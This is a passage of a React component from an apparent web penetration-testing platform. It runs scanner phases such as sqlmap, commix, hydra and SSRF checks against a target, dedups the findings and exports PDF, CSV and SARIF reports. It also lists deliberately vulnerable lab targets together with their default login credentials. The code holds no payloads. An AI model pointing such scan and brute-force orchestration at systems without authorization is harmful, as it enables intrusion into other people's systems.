    if (normTarget !== target) setTarget(normTarget);
    stopRef.current = false; setStopped(false);
    setScanStart(Date.now()); setTickN(0);
    setRunningState(true); setDone([]); setFailed([]); setSkipped([]); setAll({}); setFinished(false);
    // Save to target history
    setTargetHistory(prev => { const updated = [normTarget, ...prev.filter(t=>t!==normTarget)].slice(0,10); localStorage.setItem("cyberTargetHistory", JSON.stringify(updated)); return updated; });
    // Request notification permission
    if (typeof Notification !== "undefined" && Notification.permission === "default") Notification.requestPermission();
    const activePhases = PHASES.map((ph,i)=>({ph,i})).filter(({i,ph})=>selectedPhases.has(i) && !(isTrial && !TRIAL_TOOLS.has(ph.tool) && !isSuperAdmin));
    const isExternal = !normTarget.includes("lab_") && !normTarget.includes("localhost") && !normTarget.match(/https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/);
    const authRequiredLabs = ["lab_dvwa","lab_bwapp","lab_webgoat","lab_mutillidae"];
    const needsAuth = authRequiredLabs.some(l => normTarget.includes(l));
    const hasAuth   = !!(authCookie || authBearer);
    if (needsAuth && !hasAuth) {
      add("⚠ WARNING: " + normTarget + " requires authentication for full scanning.");
      add("💡 Click the target button again to auto-login, then restart the scan.");
      add("   Without auth: only headers/SSL/recon will be tested. Injection vulns will be missed.");
    }
    setLines(p => [...p, "[*] Starting pentest on: " + normTarget + " (" + activePhases.length + " phases selected)" + (isExternal ? " — external target, adding delays to avoid rate limiting" : "") + (hasAuth?" — authenticated":"") + (customWordlist?" — custom wordlist":"")]);
    const results = {};
    for (let idx = 0; idx < activePhases.length; idx++) {
      if (stopRef.current) {
        add("[!] Scan stopped by user after " + idx + " phase(s).");
        break;
      }
      const {ph, i} = activePhases[idx];
      setCurPhase(i);
      add("[*] Phase " + (idx+1) + "/" + activePhases.length + ": Running " + ph.tool + "...");
      try {
        const body = Object.assign({target: normTarget, scan_type:"full"}, ph.body || {}, authCookie?{auth_cookie:authCookie}:{}, authBearer?{auth_bearer:authBearer}:{}, customWordlist?{wordlist:customWordlist}:{});
        const data = await api(ph.endpoint, "POST", body, token);
        // Stop was clicked while this phase's request was in flight — discard the result.
        if (stopRef.current) {
          add("[!] Scan stopped by user during phase " + (idx+1) + ".");
          break;
        }
        results[ph.tool] = data;
        // Generic SKIPPED handler — must come BEFORE the tool-specific
        // checks. Many backend scanners detect "no testable surface" (e.g.
        // commix on a static Netlify site, sqlmap on a host with no URL
        // params, hydra on external targets without auth context) and
        // return `skipped_reason` instead of fake-PASSED findings. We
        // promote those to the SKIPPED bucket so the tile shows an honest
        // orange badge instead of misleading green PASSED.
        if (data && (data.skipped_reason || data.skipped)) {
          const reason = data.skipped_reason || "Not applicable to this target";
          add("⚠ " + ph.name + " skipped: " + reason);
          setSkipped(p => [...p, i]);
          setDone(p => [...p, i]);
          setAll(Object.assign({}, results));
          if (isExternal && idx < activePhases.length - 1) {
            await new Promise(r => setTimeout(r, 1500));
          }
          continue;
        }
        if (ph.tool==="sqlmap"  && data.vulnerable)  add("✗ SQL INJECTION FOUND — CRITICAL!");
        else if (ph.tool==="xss" && data.vulnerable) add("✗ XSS VULNERABILITY FOUND — CRITICAL!");
        else if (ph.tool==="cors"&& data.vulnerable) add("✗ CORS MISCONFIGURATION FOUND — HIGH!");
        else if (ph.tool==="ssl" && data.issues && data.issues.some(i=>i.severity==="CRITICAL")) add("✗ CRITICAL SSL/TLS ISSUES FOUND!");
        else if (ph.tool==="ffuf"          && data.discovered && data.discovered.length>0) add("✓ Web Fuzzing: " + data.discovered.length + " paths found");
        else if (ph.tool==="commix"        && data.vulnerable) add("✗ COMMAND INJECTION FOUND — CRITICAL!");
        else if (ph.tool==="lfi"           && data.vulnerable) add("✗ PATH TRAVERSAL/LFI FOUND — CRITICAL!");
        else if (ph.tool==="openredirect"  && data.vulnerable) add("✗ OPEN REDIRECT FOUND — " + data.total + " param(s)");
        else if (ph.tool==="sensitivefiles"&& data.total>0)    add("✗ SENSITIVE FILES EXPOSED: " + data.total + " found");
        else if (ph.tool==="hydra" && data.skipped)    { add("⚠ Auth Brute Force skipped for external target — use Password Attacks module."); setSkipped(p=>[...p,i]); setDone(p=>[...p,i]); setAll(Object.assign({},results)); continue; }
        else if (ph.tool==="hydra"         && data.vulnerable) add("✗ WEAK CREDENTIALS FOUND — CRITICAL!");
        else if (ph.tool==="ssrf"          && data.vulnerable) add("✗ SSRF VULNERABILITY FOUND — HIGH!");
        else if (ph.tool==="xxe"           && data.vulnerable) add("✗ XXE INJECTION FOUND — CRITICAL!");
        else if (ph.tool==="clickjacking"  && data.vulnerable) add("✗ CLICKJACKING VULNERABLE — MEDIUM");
        else if (ph.tool==="verbtamper"    && data.vulnerable) add("✗ DANGEROUS HTTP METHODS ALLOWED: " + data.total);
        else if (ph.tool==="pollution"     && data.vulnerable) add("✗ PARAMETER POLLUTION FOUND — HIGH!");
        else if (ph.tool==="csrf"          && data.vulnerable) add("✗ CSRF VULNERABILITY FOUND — " + data.total + " issue(s)");
        else if (ph.tool==="idor"          && data.vulnerable) add("✗ IDOR / ACCESS CONTROL ISSUE FOUND — HIGH!");
        else if (ph.tool==="ssti"          && data.vulnerable) add("✗ SSTI TEMPLATE INJECTION FOUND — CRITICAL!");
        else if (ph.tool==="fileupload"    && data.vulnerable) add("✗ DANGEROUS FILE UPLOAD ACCEPTED — CRITICAL!");
        else add("✓ " + ph.name + " complete");
        setDone(p => [...p, i]);
        setAll(Object.assign({}, results));
      } catch(e) {
        const msg = e.message||"unknown error";
        const hint = msg.includes("404") ? " (endpoint missing — add to main.py)" : msg.includes("Failed to fetch")||msg.includes("NetworkError") ? " (backend offline)" : "";
        add("✗ " + ph.name + " failed: " + msg + hint);
        // CRITICAL: save the error to allResults so the tile's Details panel
        // can render it. Without this, the customer sees a red ERROR badge
        // with no way to know what went wrong — exactly the gap this whole
        // session has been chasing.
        const suggested_action =
          msg.includes("404") ? "Endpoint missing from backend. Pull latest code and redeploy." :
          msg.includes("Failed to fetch") || msg.includes("NetworkError") ? "Backend is offline or CORS-blocked. Check `docker compose ps` on the VPS." :
          msg.includes("500") || msg.includes("Internal Server Error") ? "Scanner crashed on the backend. The target may be incompatible (e.g. static-only host) or hit a Python exception." :
          msg.includes("429") || msg.includes("Too Many") ? "Target rate-limited our scanner. Try again in a minute, or use auth credentials so it knows you're authorized." :
          msg.includes("timeout") || msg.includes("Timeout") || msg.includes("504") ? "Scan took too long — target may be slow or CDN-fronted. Try a smaller scope or check connectivity." :
          msg.includes("Subscription") || msg.includes("trial") || msg.includes("quota") ? "Trial limit reached. Upgrade your plan or wait until quota resets." :
          "Click Re-run to retry, or check `docker compose logs --tail 50 backend` on the VPS for the underlying cause.";
        results[ph.tool] = {
          ok: false, error: msg, suggested_action,
          findings: [], total: 0,
        };
        if (ph.tool === "hydra") {
          add("💡 Tip: Use the Password Attacks module for targeted brute force with custom wordlists and protocols.");
          setSkipped(p => [...p, i]);
        } else {
          setFailed(p => [...p, i]);
        }
        setDone(p => [...p, i]);
        setAll(Object.assign({}, results));   // ← persist error so Details panel renders
      }
      if (isExternal && idx < activePhases.length - 1) {
        await new Promise(r => setTimeout(r, 1500));
      }
    }
    if (!stopRef.current) {
      add("✓ Pentest complete — " + activePhases.length + " phases done");
      if (typeof Notification !== "undefined" && Notification.permission === "granted") {
        new Notification("Pentest Complete", { body: normTarget + " — " + activePhases.length + " phases done", icon: "" });
      }
      // ─── REMEDIATION PROGRESS: snapshot this scan for next-time comparison ───
      // Two-slot rotation in localStorage keyed by target:
      //   vulnuslab_lastScan_<target>     — the scan that JUST finished
      //   vulnuslab_previousScan_<target> — the prior one (diff target)
      // dlPDF reads previousScan to compute "fixed / new / persisting" deltas.
      try {
        const snapshot = { ts: new Date().toISOString(), findings: [] };
        PHASES.forEach(ph => {
          const r = results[ph.tool];
          if (r?.findings) r.findings.forEach(f => {
            if (f.severity && f.severity !== "INFO" && f.detail) {
              snapshot.findings.push({
                detail: String(f.detail).substring(0, 200),
                severity: f.severity,
                cwe: f.cwe || "",
                owasp: f.owasp || "",
                _tool: ph.tool
              });
            }
          });
        });
        if (results["sqlmap"]?.vulnerable) snapshot.findings.push({detail:"SQL Injection detected",severity:"CRITICAL",cwe:"CWE-89",owasp:"A03:2021",_tool:"sqlmap"});
        if (results["xss"]?.vulnerable) snapshot.findings.push({detail:"XSS vulnerability detected on target",severity:"CRITICAL",cwe:"CWE-79",owasp:"A03:2021",_tool:"xss"});
        // Rotate: previous = old last, last = new snapshot
        const oldLast = localStorage.getItem("vulnuslab_lastScan_" + normTarget);
        if (oldLast) localStorage.setItem("vulnuslab_previousScan_" + normTarget, oldLast);
        localStorage.setItem("vulnuslab_lastScan_" + normTarget, JSON.stringify(snapshot));
        if (oldLast) add("📊 Snapshot saved — next PDF will show remediation progress vs this scan");
        else add("📊 Baseline snapshot saved — re-scan this target to see remediation deltas");
      } catch(e) { /* localStorage full or disabled — non-fatal */ }
    }
    setCurPhase(-1); setRunningState(false); setFinished(true); stopRef.current = false;
  };

  const runSingle = async (ph, i) => {
    if (running) return;
    const normTarget = (t => t.startsWith("http://") || t.startsWith("https://") ? t : "http://" + t)(target.trim());
    if (!normTarget.trim()) return;
    setRunningState(true); setCurPhase(i);
    setFailed(p => p.filter(x => x !== i));
    setDone(p => p.filter(x => x !== i));
    add("[*] Re-running: " + ph.name + " on " + normTarget);
    try {
      const body = Object.assign({target: normTarget, scan_type:"full"}, ph.body || {}, authCookie?{auth_cookie:authCookie}:{}, authBearer?{auth_bearer:authBearer}:{}, customWordlist?{wordlist:customWordlist}:{});
      const data = await api(ph.endpoint, "POST", body, token);
      setAll(prev => ({...prev, [ph.tool]: data}));
      setDone(p => [...p.filter(x => x !== i), i]);
      add("✓ " + ph.name + " complete");
    } catch(e) {
      const msg = e.message || "unknown error";
      // Save error to allResults so the tile's Details panel can render it.
      const suggested_action =
        msg.includes("404") ? "Endpoint missing from backend." :
        msg.includes("Failed to fetch") || msg.includes("NetworkError") ? "Backend offline or unreachable." :
        msg.includes("500") || msg.includes("Internal Server Error") ? "Scanner crashed — target may be incompatible." :
        msg.includes("429") || msg.includes("Too Many") ? "Rate-limited by target. Wait and retry." :
        msg.includes("timeout") || msg.includes("Timeout") || msg.includes("504") ? "Scan took too long." :
        "Click Re-run to retry.";
      setAll(prev => ({...prev, [ph.tool]: {ok: false, error: msg, suggested_action, findings: [], total: 0}}));
      setFailed(p => [...p.filter(x => x !== i), i]);
      setDone(p => [...p.filter(x => x !== i), i]);
      add("✗ " + ph.name + " failed: " + msg);
    }
    setCurPhase(-1); setRunningState(false);
  };

  // PDF + CSV export
  const dlPDF = (cfg = {}) => {
    // ─── Load PREVIOUS scan snapshot for remediation diff ─────────
    // dlPDF runs AFTER scan completes, so "vulnuslab_previousScan_<target>" is
    // the second-most-recent run (the one to diff against). On the first scan
    // this is null and the Remediation Progress section gracefully skips.
    console.log("[VL] dlPDF entered. target=", target, "allResults keys=", Object.keys(allResults||{}));
    let _prevScan = null;
    try {
      const normTarget = (t => t.startsWith("http://") || t.startsWith("https://") ? t : "http://" + t)((target || "").trim());
      const raw = localStorage.getItem("vulnuslab_previousScan_" + normTarget);
      if (raw) _prevScan = JSON.parse(raw);
    } catch(e) { _prevScan = null; }
    let allFindings = [];
    // Tools whose findings are NOT actively verified — they pattern-match server
    // responses against template/signature databases, so the finding is "looks
    // TRUST-FIRST ARCHITECTURE: every finding shipped to the customer is
    // a CONFIRMED finding. We no longer surface signature/heuristic-only
    // matches as "SUSPECTED" — a re-test badge signals weakness, and the
    // customer should trust the platform, not be asked to second-guess it.
    //
    // Findings from signature scanners (nikto, nuclei) MUST pass an active
    // re-verify step in the backend before flowing here. Anything that
    // hasn't been actively verified is dropped silently — better to MISS
    // a finding than to falsely flag one. (Memory rule: feedback-real-
    // findings-zero-fp.)
    const _SIGNATURE_TOOLS = new Set(["nikto","nuclei","sherlock","dnstwist","exploitsearch"]);
    PHASES.forEach(ph => {
      if (allResults[ph.tool]?.findings) {
        allResults[ph.tool].findings.forEach(f => {
          if(f.severity==="INFO") return;
          // Signature-tool finding must carry an explicit verified flag from
          // the backend; otherwise drop it (no SUSPECTED tier). Backends that
          // haven't been retrofitted with the verify-gate yet still flow
          // through if the finding carries confidence:CONFIRMED OR
          // verified_at — both signals indicate active re-verification.
          if (_SIGNATURE_TOOLS.has(ph.tool)) {
            if (f.confidence !== "CONFIRMED" && !f.verified_at) {
              return;  // drop unverified signature hit
            }
          }
          allFindings.push({...f, _tool: ph.tool, confidence: "CONFIRMED"});
        });
      }
    });
    // XSS — returns {vulnerable:true} not findings array. Verified by active probe.
    if (allResults["xss"]?.vulnerable) {
      allFindings.push({_tool:"xss", confidence:"CONFIRMED", detail:"XSS vulnerability detected on target",severity:"CRITICAL",cvss:"9.0",cve:"N/A",cwe:"CWE-79",cwe_name:"Cross-Site Scripting",owasp:"A03:2021 - Injection",remediation:"Sanitize all user input. Implement Content-Security-Policy header."});
    }
    // CORS — backend's /api/scan/cors already returns a proper finding in its findings[] array,
    // which is collected by the loop above. We do NOT add a synthetic finding here — that would
    // create a duplicate in the report (one from backend, one synthetic).
    // SQLMap — backend triggered the injection and verified, so CONFIRMED.
    if (allResults["sqlmap"]?.vulnerable) {
      allFindings.push({_tool:"sqlmap", confidence:"CONFIRMED", detail:"SQL Injection detected",severity:"CRITICAL",cvss:"9.8",cve:"N/A",cwe:"CWE-89",cwe_name:"SQL Injection",owasp:"A03:2021 - Injection",remediation:"Use parameterized queries immediately."});
    }
    // Cookie findings come through PHASES.forEach loop above (scanner now
    // returns findings[] directly + raw_data.cookies.analyzed for PDF section).
    // The old manual iteration crashed because the new shape is an object, not array.

    // ─── DEDUP: suppress contradictory + duplicate findings ───────────
    // Different scanners often detect the same underlying issue (e.g. nikto AND sensitivefiles
    // both flag /robots.txt; clickjacking AND headers both flag missing X-Frame-Options).
    // We compute a canonical "fingerprint" per finding and, within each group, keep the
    // MOST SPECIFIC one (scanner-named issue beats generic "Missing X header") so the master
    // findings table surfaces e.g. "Clickjacking" rather than "Missing X-Frame-Options".
    const _cookiesScannerFoundNone = (() => {
      const c = allResults["cookies"];
      if (!c) return false;
      // New shape: raw_data.cookies.analyzed[]. Old shape: c.cookies[].
      const analyzed = c.raw_data?.cookies?.analyzed
                     ?? (Array.isArray(c.cookies) ? c.cookies : null);
      return Array.isArray(analyzed) && analyzed.length === 0;
    })();
    const _fingerprint = (f) => {
      const d = (f.detail || "").toLowerCase();
      const cn = (f.cwe_name || "").toLowerCase();
      // Canonical issue indicators — collapse duplicates from different scanners
      if (d.includes("referrer-policy")) return "header:referrer-policy";
      if (d.includes("content-security-policy") || /\bcsp\b/.test(d)) return "header:csp";
      if (d.includes("hsts") || d.includes("strict-transport-security")) return "header:hsts";
      if (d.includes("x-frame-options") || d.includes("clickjacking") || cn.includes("clickjacking") || d.includes("frame-ancestors")) return "header:x-frame";
      if (d.includes("x-content-type-options")) return "header:x-content-type";
      if (d.includes("permissions-policy")) return "header:permissions-policy";
      // File-based: collapse same file detected by different scanners.
      // Match with OR without leading slash — nikto says "robots.txt exposes hidden paths"
      // while sensitivefiles says "Accessible: /robots.txt" — both refer to same file.
      const fileMatch = d.match(/\b(robots\.txt|security\.txt|\.git\b|\.env\b|\.svn|\.ds_store|composer\.json|package\.json|dockerfile|docker-compose\.yml)/);
      if (fileMatch) return "file:" + fileMatch[1];
      // Default: CWE family + first 35 chars of detail
      return (f.cwe || "no-cwe") + "|" + d.substring(0, 35);
    };
    // Specificity score — higher = more specific finding kept when dedup collides.
    // Prefers scanner-named root cause ("Clickjacking", "SQL Injection") over generic
    // header advisories ("Missing X-Frame-Options"). Severity is the tiebreaker so a
    // CRITICAL beats a LOW even if both are equally specific.
    const _specificity = (f) => {
      const d = (f.detail || "").toLowerCase();
      const cn = (f.cwe_name || "").toLowerCase();
      let s = 0;
      // Specific vulnerability names beat generic "Missing X header" wording
      if (cn.includes("clickjacking") || d.includes("can be embedded in any iframe")) s += 100;
      if (cn.includes("cross-site scripting") || cn.includes("sql injection") || cn.includes("injection")) s += 80;
      if (cn.includes("csp misconfiguration") || cn.includes("weak hsts")) s += 60;
      if (d.startsWith("missing ")) s -= 30; // generic header advisory
      // Severity weight — CRITICAL beats LOW when otherwise equal
      const sevW = {CRITICAL:50, HIGH:35, MEDIUM:20, LOW:8, INFO:0}[f.severity] || 0;
      // Longer detail = usually more specific (capped to avoid runaway)
      const lenW = Math.min((f.detail || "").length, 200) / 10;
      return s + sevW + lenW;
    };
    // First pass — cookie contradiction filter (unchanged).
    allFindings = allFindings.filter(f => {
      if (_cookiesScannerFoundNone) {
        const d = (f.detail || "").toLowerCase();
        const cwe = (f.cwe || "").toUpperCase();
        if ((cwe === "CWE-384" || cwe === "CWE-1004" || cwe === "CWE-614") && d.includes("cookie")) {
          return false;
        }
      }
      return true;
    });
    // Second pass — group by fingerprint, keep highest-specificity per group.
    const _best = new Map();
    allFindings.forEach(f => {
      const fp = _fingerprint(f);
      const sc = _specificity(f);
      const cur = _best.get(fp);
      if (!cur || sc > cur.score) _best.set(fp, {finding: f, score: sc});
    });
    allFindings = Array.from(_best.values()).map(v => v.finding);
    // Sort final findings by severity so master table reads CRITICAL → INFO
    const _sevOrder = {CRITICAL:0, HIGH:1, MEDIUM:2, LOW:3, INFO:4};
    allFindings.sort((a, b) => (_sevOrder[a.severity] ?? 5) - (_sevOrder[b.severity] ?? 5));

    // Tools used list for cover page
    const toolsUsed = Object.keys(allResults).filter(k=>allResults[k]);
    const _riskPenalty = allFindings.reduce((s,f)=>s+({CRITICAL:15,HIGH:8,MEDIUM:3,LOW:1}[f.severity]||0),0);
    const riskScore = Math.max(0, 100 - _riskPenalty);
    const riskLabel = riskScore<40?"CRITICAL":riskScore<70?"HIGH":riskScore<90?"MEDIUM":riskScore<100?"LOW":"SAFE";

    // ─── REMEDIATION DIFF vs previous scan ──────────────────────
    // Compute fixed / new / persisting buckets by hashing each finding to
    // a stable key (cwe + first 40 chars of detail). The same fingerprinting
    // strategy used by dedup so a renamed scanner output doesn't flag a
    // "new" finding when it's really the same root cause.
    let _remediation = null;
    if (_prevScan && Array.isArray(_prevScan.findings) && _prevScan.findings.length > 0) {
      const _key = f => (f.cwe || "") + "|" + String(f.detail || "").toLowerCase().substring(0, 40);
      const curKeys  = new Set(allFindings.map(_key));
      const prevKeys = new Set(_prevScan.findings.map(_key));
      const fixed = _prevScan.findings.filter(f => !curKeys.has(_key(f)));
      const novel = allFindings.filter(f => !prevKeys.has(_key(f)));
      const persisting = allFindings.filter(f => prevKeys.has(_key(f)));
      _remediation = {
        prevDate: (_prevScan.ts || "").substring(0, 10),
        prevTotal: _prevScan.findings.length,
        fixed, novel, persisting
      };
    }

    generatePDF({
      target, riskScore, riskLabel,
      remediation: _remediation,
      companyName:  cfg.companyName  || "VulnusLab",
      // Upgrade stale defaults from older app versions automatically — if user has
      // the OLD generic "Security Analyst / Penetration Tester" cached, replace with
      // the new branded defaults. Custom values set by the user are preserved.
      reporterName: (cfg.reporterName && cfg.reporterName !== "Security Analyst") ? cfg.reporterName : "VulnusLab Automated Pentest",
      reporterRole: (cfg.reporterRole && cfg.reporterRole !== "Penetration Tester") ? cfg.reporterRole : "Security Assessment Engine · vulnuslab.com",
      customLogo:   cfg.customLogo   || null,
      template:     cfg.template     || "standard",
      date: (cfg.date ? cfg.date + " " : "") + new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'}),
      summary: {
        critical: allFindings.filter(f=>f.severity==="CRITICAL").length,
        high:     allFindings.filter(f=>f.severity==="HIGH").length,
        medium:   allFindings.filter(f=>f.severity==="MEDIUM").length,
        low:      allFindings.filter(f=>f.severity==="LOW").length,
      },
      findings:  allFindings,
      ports:     allResults["nmap"]     ? allResults["nmap"].ports        : [],
      gobuster:  allResults["gobuster"] ? allResults["gobuster"].discovered: [],
      ffuf:      allResults["ffuf"]     ? allResults["ffuf"].discovered   : [],
      whatweb:   allResults["whatweb"]  ? allResults["whatweb"].output    : "",
      toolsUsed,
      sqlmap:     allResults["sqlmap"]     || null,
      subdomains:  allResults["subdomains"] ? (allResults["subdomains"].subdomains || []) : [],
      dns:         allResults["dig"]        ? (allResults["dig"].records        || {}) : {},
      wafw00f:    allResults["wafw00f"]    || null,
      cms:        allResults["cms"]        || null,
      ssl:        allResults["ssl"]        || null,
      cookies:    allResults["cookies"]    || null,
      cors:         allResults["cors"]         || null,
      xss:          allResults["xss"]          || null,
      commix:       allResults["commix"]       || null,
      lfi:          allResults["lfi"]          || null,
      openredirect: allResults["openredirect"] || null,
      sensitivefiles:allResults["sensitivefiles"]||null,
      hydra:        allResults["hydra"]        || null,
      ssrf:         allResults["ssrf"]         || null,
      xxe:          allResults["xxe"]          || null,
      clickjacking:     allResults["clickjacking"]     || null,
      verbtamper:       allResults["verbtamper"]       || null,
      pollution:        allResults["pollution"]        || null,
      csrf:             allResults["csrf"]             || null,
      idor:             allResults["idor"]             || null,
      ssti:             allResults["ssti"]             || null,
      fileupload:       allResults["fileupload"]       || null,
      deserial:         allResults["deserial"]         || null,
      protopollution:   allResults["protopollution"]   || null,
      typejuggling:     allResults["typejuggling"]     || null,
      jwt:              allResults["jwt"]              || null,
      graphql:          allResults["graphql"]          || null,
      nosql:            allResults["nosql"]            || null,
      oauth:            allResults["oauth"]            || null,
      hostheader:       allResults["hostheader"]       || null,
      websocket:        allResults["websocket"]        || null,
      takeover:         allResults["takeover"]         || null,
      otp:              allResults["otp"]              || null,
      rfi:              allResults["rfi"]              || null,
      smuggling:        allResults["smuggling"]        || null,
      responsesplitting:allResults["responsesplitting"]|| null,
      sessionfixation:  (() => {
        // If cookies scanner found NO cookies on the target, suppress sessionfixation's
        // cookie-related findings — they're probing artifacts that contradict Section 12.
        // Keeps Section 15 status accurate (PASSED instead of false VULNERABLE) and
        // prevents Section 21 from rendering empty/contradictory cookie advice.
        const sf = allResults["sessionfixation"];
        if (!sf) return null;
        const noCookies = allResults["cookies"] && (!allResults["cookies"].cookies || allResults["cookies"].cookies.length === 0);
        if (!noCookies) return sf;
        const filtered = (sf.findings || []).filter(f => !((f.detail || "").toLowerCase().includes("cookie")));
        return { ...sf, findings: filtered, vulnerable: filtered.some(f => f.severity && f.severity !== "INFO" && f.severity !== "LOW") };
      })(),
      dataexfil:        allResults["dataexfil"]        || null,
      racecondition:    allResults["racecondition"]    || null,
      smb:              allResults["smb"]              || null,
      ftp:              allResults["ftp"]              || null,
      smtp:             allResults["smtp"]             || null,
      snmp:             allResults["snmp"]             || null,
    });
  };

  // Aggregate findings ONCE — same logic the PDF uses — so CSV / JSON / SARIF
  // all export from the same source of truth. Includes the Trust-First
  // metadata (tool, confidence, verified_at, evidence_marker).
  const _collectFindingsForExport = () => {
    const collected = [];
    PHASES.forEach(ph => {
      if (allResults[ph.tool]?.findings) {
        allResults[ph.tool].findings.forEach(f => {
          if (f.severity !== "INFO") collected.push({...f, _tool: ph.tool});
        });
      }
    });
    if (allResults["xss"]?.vulnerable)    collected.push({_tool:"xss", confidence:"CONFIRMED", severity:"CRITICAL", cvss:"9.0", cve:"N/A", cwe:"CWE-79", cwe_name:"Cross-Site Scripting", detail:"XSS vulnerability detected on target", owasp:"A03:2021", remediation:"Sanitize all user input. Implement CSP."});
    if (allResults["sqlmap"]?.vulnerable) collected.push({_tool:"sqlmap", confidence:"CONFIRMED", severity:"CRITICAL", cvss:"9.8", cve:"N/A", cwe:"CWE-89", cwe_name:"SQL Injection", detail:"SQL Injection detected", owasp:"A03:2021", remediation:"Use parameterised queries."});
    return collected;
  };

  const dlJSON = () => {
    // Pure raw dump — every scanner's full response.
    const payload = {
      schema:    "vulnuslab.json/v1",
      target,
      scan_date: new Date().toISOString(),
      results:   allResults,
    };
    const blob = new Blob([JSON.stringify(payload, null, 2)], {type:"application/json"});
    const a = document.createElement("a"); a.href = URL.createObjectURL(blob);
    a.download = "pentest_raw_" + Date.now() + ".json"; a.click();
  };

  const dlCSV = () => {
    const findings = _collectFindingsForExport();
    // CSV column set chosen to satisfy security-team intake tools
    // (most expect: tool, severity, CVSS, CWE, OWASP, confidence,
    // verified-at, evidence, detail, remediation).
    const rows = [["Tool","Severity","CVSS","CVE","CWE","CWE Name","OWASP","Confidence","Verified At","Evidence","Finding","Remediation"]];
    const _esc = (v) => `"${String(v || "").replace(/"/g, '""').replace(/[\r\n]+/g, " ")}"`;
    findings.forEach(f => rows.push([
      _esc(f._tool || ""),
      _esc(f.severity || ""),
      _esc(f.cvss || ""),
      _esc(f.cve || ""),
      _esc(f.cwe || ""),
      _esc(f.cwe_name || ""),
      _esc(f.owasp || ""),
      _esc(f.confidence || "CONFIRMED"),
      _esc(f.verified_at || ""),
      _esc(f.evidence_marker || ""),
      _esc(f.detail || ""),
      _esc(f.remediation || ""),
    ]));
    const csv = rows.map(r => r.join(",")).join("\n");
    const blob = new Blob([csv], {type:"text/csv"});
    const a = document.createElement("a"); a.href = URL.createObjectURL(blob);
    a.download = "pentest_findings_" + Date.now() + ".csv"; a.click();
  };

  const dlSARIF = () => {
    // SARIF 2.1.0 — industry-standard schema consumed by GitHub Code
    // Scanning, GitLab SAST dashboards, Microsoft Defender for Cloud,
    // VS Code's SARIF Viewer, Azure DevOps. Customers can drop our
    // SARIF into their existing security pipeline with zero glue code.
    const findings = _collectFindingsForExport();
    // Build the unique rules catalog — one SARIF rule per CWE
    const ruleMap = {};
    findings.forEach(f => {
      const id = f.cwe || "VULN-UNKNOWN";
      if (!ruleMap[id]) {
        ruleMap[id] = {
          id,
          name: f.cwe_name || "Security Finding",
          shortDescription: { text: f.cwe_name || "Security Finding" },
          fullDescription:  { text: f.cwe_name || "Security Finding" },
          help: { text: f.remediation || "Apply security hardening.",
                  markdown: `**Remediation:** ${f.remediation || "Apply security hardening."}` },
          properties: {
            "security-severity": String(f.cvss || "5.0"),
            tags: ["security", f.owasp || ""].filter(Boolean),
          },
        };
      }
    });
    const _sevLevel = (s) => {
      // SARIF only has: none / note / warning / error
      if (s === "CRITICAL" || s === "HIGH") return "error";
      if (s === "MEDIUM") return "warning";
      return "note";
    };
    const sarif = {
      $schema: "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
      version: "2.1.0",
      runs: [{
        tool: {
          driver: {
            name:    "VulnusLab",
            version: "1.0.0",
            informationUri: "https://vulnuslab.com",
            rules: Object.values(ruleMap),
          },
        },
        results: findings.map(f => ({
          ruleId: f.cwe || "VULN-UNKNOWN",
          level:  _sevLevel(f.severity),
          message: { text: f.detail || "Security finding" },
          locations: [{
            physicalLocation: {
              artifactLocation: { uri: target || "unknown-target" },
            },
          }],
          properties: {
            tool:        f._tool || "",
            severity:    f.severity || "",
            cvss:        f.cvss || "",
            confidence:  f.confidence || "CONFIRMED",
            verified_at: f.verified_at || "",
            evidence:    f.evidence_marker || "",
            owasp:       f.owasp || "",
          },
        })),
        invocations: [{
          executionSuccessful: true,
          startTimeUtc: new Date().toISOString(),
        }],
      }],
    };
    const blob = new Blob([JSON.stringify(sarif, null, 2)], {type:"application/sarif+json"});
    const a = document.createElement("a"); a.href = URL.createObjectURL(blob);
    a.download = "pentest_" + Date.now() + ".sarif"; a.click();
  };

  return (
    <div className="fade">
      <div style={{background:"linear-gradient(135deg,#0c1a3d,#0f172a)",border:"1px solid #1e3a8a",borderRadius:8,padding:20,marginBottom:16}}>
        {/* Header */}
        <div style={{display:"flex",alignItems:"center",gap:10,marginBottom:10,flexWrap:"wrap"}}>
          <span style={{fontSize:20}}>🌐</span>
          <h2 style={{fontSize:16,fontWeight:700,color:"#f1f5f9",margin:0}}>Web Application Penetration Testing</h2>
          <Badge label={PHASES.length+" PHASES"} color="blue"/>
          <Badge label="REAL TOOLS" color="green"/>
          {running && <Badge label="LIVE SCAN" color="blue"/>}
          {finished && <Badge label="SCAN COMPLETE" color="green"/>}
        </div>

        {/* Progress bar when running */}
        {(running || finished) && (
          <div style={{marginBottom:12}}>
            <div style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
              <span style={{fontSize:11,color:"#64748b",fontFamily:"JetBrains Mono,monospace"}}>
                {running ? `Phase ${done.length+1} of ${PHASES.length} running...` : `${done.length} / ${PHASES.length} phases complete`}
              </span>
              <span style={{fontSize:11,color:"#64748b",fontFamily:"JetBrains Mono,monospace"}}>{Math.round((done.length/PHASES.length)*100)}%</span>
            </div>
            <div style={{height:4,background:"#0f172a",borderRadius:4,overflow:"hidden"}}>
              <div style={{height:"100%",width:`${(done.length/PHASES.length)*100}%`,background:finished?"#22c55e":"linear-gradient(90deg,#3b82f6,#06b6d4)",borderRadius:4,transition:"width 0.4s ease"}}/>
            </div>
          </div>
        )}

        <TestTargets targets={[
          {label:"DVWA",       value:"http://lab_dvwa",                   color:"#dc2626", lab:"dvwa"},
          {label:"WebGoat",    value:"http://lab_webgoat:8080/WebGoat",   color:"#ea580c", lab:"webgoat"},
          {label:"Juice Shop", value:"http://lab_juiceshop:3000",         color:"#16a34a", lab:"juiceshop"},
          {label:"Mutillidae", value:"http://lab_mutillidae",             color:"#a855f7", lab:"mutillidae"},
          {label:"bWAPP",      value:"http://lab_bwapp/bWAPP/login.php",  color:"#ca8a04", lab:"bwapp"},
          {label:"testphp",    value:"http://testphp.vulnweb.com",        color:"#0ea5e9", lab:null},
        ]} onSelect={async (t, lab) => {
          setTarget(t);
          setAuthorized(false);
          setShowHistory(false);
          const LAB_CREDS = {
            dvwa:       { url: "http://lab_dvwa/login.php",                              user: "admin",              pass: "password" },
            webgoat:    { url: "http://lab_webgoat:8080/WebGoat/login",                  user: "guest",              pass: "guest"    },
